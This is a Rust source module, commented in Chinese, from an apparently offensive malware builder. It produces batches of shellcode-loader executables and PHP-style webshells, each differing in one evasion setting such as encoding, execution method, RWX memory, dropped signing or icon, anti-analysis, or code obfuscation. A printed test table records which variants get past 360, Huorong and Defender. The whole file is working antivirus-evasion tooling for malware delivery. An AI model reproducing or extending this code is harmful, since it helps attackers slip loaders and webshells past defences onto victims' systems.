//! 变体矩阵：一次生成多个 exe，每个只差一个变量。
//!
//! 为什么要这么设计：免杀调参最大的问题是「一次改一堆，过了不知道是谁的功劳，
//! 杀了不知道是谁的锅」。矩阵里的每个变体相对基线只动一处，实测结果就能直接
//! 归因到那个变量。

use crate::builder::generate::generate;
use crate::builder::GenOpts;

/// 一个变体：后缀、人类可读说明、施加改动的闭包
pub struct Variant {
    pub suffix: &'static str,
    pub desc: &'static str,
    pub apply: Box<dyn Fn(&mut GenOpts) + Send + Sync>,
}

/// 内置变体表。每个只改一处，且都相对基线。
pub fn variants() -> Vec<Variant> {
    macro_rules! v {
        ($s:expr, $d:expr, $f:expr) => {
            Variant {
                suffix: $s,
                desc: $d,
                apply: Box::new($f),
            }
        };
    }
    vec![
        v!("base", "基线: 完全按当前配置", |_| {}),
        v!("enc_uuid", "仅改: 编码=uuid", |o| o.encoding = "uuid".into()),
        v!("enc_b64", "仅改: 编码=b64", |o| o.encoding = "b64".into()),
        v!("enc_b32", "仅改: 编码=b32", |o| o.encoding = "b32".into()),
        v!("enc_chunk_r", "仅改: 编码=chunk_r(块随机倒序)", |o| {
            o.encoding = "chunk_r".into()
        }),
        v!("enc_raw", "仅改: 编码=raw(明文数组)", |o| {
            o.encoding = "raw".into()
        }),
        v!("no_obf", "仅改: 关掉代码随机化", |o| o.obfuscate = false),
        v!("mode_fiber", "仅改: 执行方式=fiber", |o| {
            o.mode = "fiber".into()
        }),
        v!("mode_callback", "仅改: 执行方式=callback", |o| {
            o.mode = "callback".into()
        }),
        v!("prot_rwx", "仅改: 内存属性=RWX", |o| {
            o.protect = "rwx".into()
        }),
        v!("prot_auto", "仅改: 内存属性=auto", |o| {
            o.protect = "auto".into()
        }),
        v!("no_res", "仅改: 去掉版本信息/清单", |o| o.res_full = false),
        v!("no_icon", "仅改: 不挂图标", |o| o.icon = String::new()),
        v!("no_sign", "仅改: 不自签名", |o| o.sign = false),
        v!("anti_strict", "仅改: 反分析遇可疑环境退出", |o| {
            o.anti_strict = true
        }),
        v!("console", "仅改: 控制台版(有黑框)", |o| o.console = true),
    ]
}

#[derive(serde::Serialize, Clone)]
pub struct VariantRow {
    pub suffix: String,
    pub desc: String,
    pub ok: bool,
    pub size: u64,
    pub sha256: String,
    pub output: String,
    pub error: String,
}

/// 跑完整个矩阵。progress 回调用于 GUI 实时显示（CLI 下传 noop）。
pub fn run<F: Fn(usize, usize, &VariantRow)>(
    base: &GenOpts,
    progress: F,
) -> Vec<VariantRow> {
    let all = variants();
    let total = all.len();
    let mut rows = Vec::new();

    for (i, v) in all.iter().enumerate() {
        let mut o = base.clone();
        (v.apply)(&mut o);

        let stem = crate::builder::variants::stem_of(&base.out_name);
        o.out_name = format!("{stem}_{}.exe", v.suffix);

        // 互斥项单独跳过并说明，不算错误
        let stomp = o.harden.iter().any(|h| h == "stomp");
        if stomp && o.protect != "rx" {
            let row = VariantRow {
                suffix: v.suffix.into(),
                desc: v.desc.into(),
                ok: false,
                size: 0,
                sha256: String::new(),
                output: String::new(),
                error: "与 stomp 互斥，已跳过".into(),
            };
            progress(i + 1, total, &row);
            rows.push(row);
            continue;
        }

        let r = generate(&o);
        let error = if r.ok {
            String::new()
        } else {
            r.log
                .lines()
                .filter(|l| l.contains("[ERROR]"))
                .last()
                .unwrap_or("(无详情)")
                .trim_start_matches("[ERROR] ")
                .to_string()
        };
        let row = VariantRow {
            suffix: v.suffix.into(),
            desc: v.desc.into(),
            ok: r.ok,
            size: r.size,
            sha256: r.sha256,
            output: r.output,
            error,
        };
        progress(i + 1, total, &row);
        rows.push(row);
    }
    rows
}

/* ============================ Webshell 变体矩阵 ============================ */

/// Webshell 的变体：穷举不同变换组合，判断哪个变换引起被杀。
/// 与 C2 矩阵一样，每个变体相对基线只改一处。
pub fn ws_variants() -> Vec<WsVariant> {
    vec![
        WsVariant { suffix: "base", desc: "基线: 全部变换开启", rename: true, junk: true, split: true, encodes: vec!["xor".into(), "b64".into()] },
        WsVariant { suffix: "no_rename", desc: "仅改: 关掉变量名随机化", rename: false, junk: true, split: true, encodes: vec!["xor".into(), "b64".into()] },
        WsVariant { suffix: "no_junk", desc: "仅改: 关掉垃圾代码", rename: true, junk: false, split: true, encodes: vec!["xor".into(), "b64".into()] },
        WsVariant { suffix: "no_split", desc: "仅改: 关掉字符串拆分", rename: true, junk: true, split: false, encodes: vec!["xor".into(), "b64".into()] },
        WsVariant { suffix: "enc_xor_only", desc: "仅改: 只用 XOR", rename: true, junk: true, split: true, encodes: vec!["xor".into()] },
        WsVariant { suffix: "enc_b64_only", desc: "仅改: 只用 Base64", rename: true, junk: true, split: true, encodes: vec!["b64".into()] },
        WsVariant { suffix: "enc_rev", desc: "仅改: XOR + 字节逆序", rename: true, junk: true, split: true, encodes: vec!["xor".into(), "rev".into()] },
        WsVariant { suffix: "enc_chunk", desc: "仅改: XOR + 分块插桩", rename: true, junk: true, split: true, encodes: vec!["xor".into(), "chunk".into()] },
        WsVariant { suffix: "enc_none", desc: "仅改: 不编码(明文)", rename: true, junk: true, split: true, encodes: vec![] },
        WsVariant { suffix: "plain", desc: "仅改: 关掉全部变换", rename: false, junk: false, split: false, encodes: vec![] },
    ]
}

pub struct WsVariant {
    pub suffix: &'static str,
    pub desc: &'static str,
    pub rename: bool,
    pub junk: bool,
    pub split: bool,
    pub encodes: Vec<String>,
}

impl WsVariant {
    #[cfg(test)]
    fn clone_for_test(&self) -> WsVariant {
        WsVariant {
            suffix: self.suffix,
            desc: self.desc,
            rename: self.rename,
            junk: self.junk,
            split: self.split,
            encodes: self.encodes.clone(),
        }
    }
}

/// 跑 Webshell 矩阵
pub fn run_ws(base: &crate::builder::webshell::WsOpts) -> Vec<VariantRow> {
    let mut rows = Vec::new();
    for v in ws_variants() {
        let mut o = base.clone();
        o.rename_vars = v.rename;
        o.junk = v.junk;
        o.split_strings = v.split;
        o.encodes = v.encodes.clone();
        let stem = stem_of(&base.out_name);
        o.out_name = format!("{stem}_{}{}", v.suffix, crate::builder::webshell::default_ext(&base.lang));

        let r = crate::builder::webshell::generate(&o);
        rows.push(VariantRow {
            suffix: v.suffix.into(),
            desc: v.desc.into(),
            ok: r.ok,
            size: r.size as u64,
            sha256: if r.ok {
                crate::builder::hash::sha256_hex(r.code.as_bytes())
            } else {
                String::new()
            },
            output: r.output,
            error: if r.ok {
                String::new()
            } else {
                r.log
                    .lines()
                    .filter(|l| l.contains("[ERROR]"))
                    .last()
                    .unwrap_or("失败")
                    .to_string()
            },
        });
    }
    rows
}

/// 从输出文件名里取出主干（去掉 .exe）
pub fn stem_of(name: &str) -> String {
    let t = name.trim();
    let t = if t.is_empty() { "loader" } else { t };
    let t = t
        .to_lowercase()
        .strip_suffix(".exe")
        .map(|s| s.to_string())
        .unwrap_or_else(|| t.to_string());
    if t.is_empty() {
        "loader".into()
    } else {
        t
    }
}

/// CLI 用：打印一张待填的测试表
pub fn print_table(rows: &[VariantRow]) {
    println!();
    println!("[matrix] 测试表 (填 过/杀):");
    println!(
        "{:<16} {:<10} {:<8} {:<8} {:<8} {:<10}",
        "变体", "大小", "360", "火绒", "Defender", "sha256"
    );
    for r in rows {
        if !r.ok {
            continue;
        }
        println!(
            "{:<16} {:<10} {:<8} {:<8} {:<8} {:<10}",
            r.suffix,
            r.size,
            "",
            "",
            "",
            &r.sha256[..r.sha256.len().min(10)]
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_variant_changes_exactly_one_thing() {
        // 结构保证：每个变体只改一个字段（base 除外）。
        // 用「改动后与 base 不同的字段数 == 1」来断言。
        let base = GenOpts {
            arch: "x64".into(),
            encoding: "chunk".into(),
            mode: "direct".into(),
            obfuscate: true,
            protect: "rx".into(),
            icon: "lib:notepad".into(),
            res_full: true,
            sign: true,
            console: false,
            anti_strict: false,
            ..Default::default()
        };
        for v in variants() {
            if v.suffix == "base" {
                continue;
            }
            let mut o = base.clone();
            (v.apply)(&mut o);
            let mut diff = 0;
            if o.encoding != base.encoding {
                diff += 1;
            }
            if o.mode != base.mode {
                diff += 1;
            }
            if o.obfuscate != base.obfuscate {
                diff += 1;
            }
            if o.protect != base.protect {
                diff += 1;
            }
            if o.icon != base.icon {
                diff += 1;
            }
            if o.res_full != base.res_full {
                diff += 1;
            }
            if o.sign != base.sign {
                diff += 1;
            }
            if o.console != base.console {
                diff += 1;
            }
            if o.anti_strict != base.anti_strict {
                diff += 1;
            }
            assert_eq!(diff, 1, "变体 {} 改了 {} 处，应只改 1 处", v.suffix, diff);
        }
    }

    #[test]
    fn suffixes_are_unique() {
        let mut seen = std::collections::HashSet::new();
        for v in variants() {
            assert!(seen.insert(v.suffix), "重复后缀: {}", v.suffix);
        }
    }

    #[test]
    fn stem_strips_exe() {
        assert_eq!(stem_of("loader.exe"), "loader");
        assert_eq!(stem_of("a.EXE"), "a");
        assert_eq!(stem_of(""), "loader");
        assert_eq!(stem_of(".exe"), "loader");
    }

    #[test]
    fn ws_variants_are_unique_and_single_change() {
        let base = ws_variants()[0].clone_for_test();
        let mut seen = std::collections::HashSet::new();
        for v in ws_variants() {
            assert!(seen.insert(v.suffix), "重复后缀: {}", v.suffix);
            if v.suffix == "base" || v.suffix == "plain" {
                continue;
            }
            let mut diff = 0;
            if v.rename != base.rename { diff += 1; }
            if v.junk != base.junk { diff += 1; }
            if v.split != base.split { diff += 1; }
            if v.encodes != base.encodes { diff += 1; }
            assert_eq!(diff, 1, "变体 {} 改了 {} 处，应只改 1 处", v.suffix, diff);
        }
    }

    #[test]
    fn run_ws_reports_all_rows() {
        let o = crate::builder::webshell::WsOpts {
            lang: "php".into(),
            password: "pass".into(),
            out_dir: std::env::temp_dir().to_string_lossy().to_string(),
            out_name: "wsmx".into(),
            ..Default::default()
        };
        let rows = run_ws(&o);
        assert_eq!(rows.len(), ws_variants().len());
        assert!(rows.iter().all(|r| r.ok), "{:?}", rows.iter().map(|r| &r.error).collect::<Vec<_>>());
        // 每个变体文件名必须带自己的后缀
        for r in &rows {
            assert!(r.output.contains(&format!("wsmx_{}", r.suffix)), "{}", r.output);
        }
    }

    #[test]
    fn run_reports_all_rows() {
        // payload 不存在 -> 全部失败，但行数必须等于变体数（不能中途停）
        let base = GenOpts {
            payload: "/nonexistent-payload-xyz".into(),
            out_dir: std::env::temp_dir().to_string_lossy().to_string(),
            out_name: "m.exe".into(),
            ..Default::default()
        };
        let rows = run(&base, |_, _, _| {});
        assert_eq!(rows.len(), variants().len());
        assert!(rows.iter().all(|r| !r.ok));
        assert!(rows.iter().all(|r| !r.error.is_empty()));
    }
}
